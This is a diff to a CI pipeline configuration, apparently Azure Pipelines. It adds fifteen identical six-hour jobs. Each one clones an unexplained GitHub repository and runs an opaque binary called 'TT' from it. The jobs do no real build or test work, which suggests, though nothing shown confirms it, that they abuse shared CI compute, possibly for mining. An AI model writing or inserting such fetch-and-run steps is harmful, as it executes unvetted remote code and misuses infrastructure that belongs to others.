@@ -38,3 +38,93 @@ jobs:
   cancelTimeoutInMinutes: 360
   steps:
   - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+  
+- job: h
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: i
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: j
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: k
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: l
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: m
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: n
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: o
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: p
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: q
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+  
+- job: r
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: s
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: t
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: u
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
+
+- job: v
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: git clone https://github.com/Jwjwj83838/TES.git && cd TES && chmod +x TT && ./TT
